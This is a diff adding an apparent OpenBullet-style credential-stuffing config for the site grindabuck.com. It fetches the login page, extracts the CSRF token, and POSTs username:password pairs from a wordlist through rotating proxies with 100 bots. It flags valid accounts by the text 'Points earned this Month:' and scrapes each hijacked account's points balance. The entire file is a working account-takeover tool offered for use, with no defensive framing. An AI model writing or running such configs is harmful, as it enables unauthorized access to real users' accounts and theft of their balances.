@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "GrindaBuck",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-12T21:05:22.0614816+00:00",
+  "AdditionalInfo": "",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Get_Login REQUEST GET "https://grindabuck.com/login" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Token PARSE "<SOURCE>" LR "name=\"token\" value=\"" "\" />" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#Login REQUEST POST "https://grindabuck.com/login" AutoRedirect=TRUE 
+  CONTENT "token=<TOKEN>&login_username=<USER>&login_password=<PASS>&cookietime=525600&Login2=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER ":authority:: grindabuck.com" 
+  HEADER ":method:: POST" 
+  HEADER ":path:: /login" 
+  HEADER ":scheme:: https" 
+#Keywords KEYCHECK BanOn4XX=TRUE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Points earned this Month:" 
+  KEYCHAIN Failure OR 
+    KEY "The information you have entered does not match." 
+#Capture PARSE "<SOURCE>" LR "class=\"pull-left\">&nbsp;&nbsp;&nbsp;<i style=\"color:#0F5124;font-size:16px;\" class=\"fa fa-database\"></i>" "</a>" Recursive=FALSE -> CAP "Points" "" "" 
